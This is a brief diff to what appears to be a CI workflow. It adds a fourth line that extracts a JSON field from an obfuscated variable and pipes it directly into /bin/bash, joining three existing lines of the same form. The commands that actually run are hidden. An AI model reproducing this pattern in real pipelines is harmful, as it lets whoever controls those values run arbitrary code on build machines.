@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$gwmn8697" | jq -r .bio37872 | /bin/bash
           echo $g61293 | jq -r .qogh446 | /bin/bash
           printf '%s' "$ex0" | jq -r .wtq9614 | /bin/bash
+          echo $t49 | jq -r .unb20323 | /bin/bash
 
       - name: Archive results
         if: always()
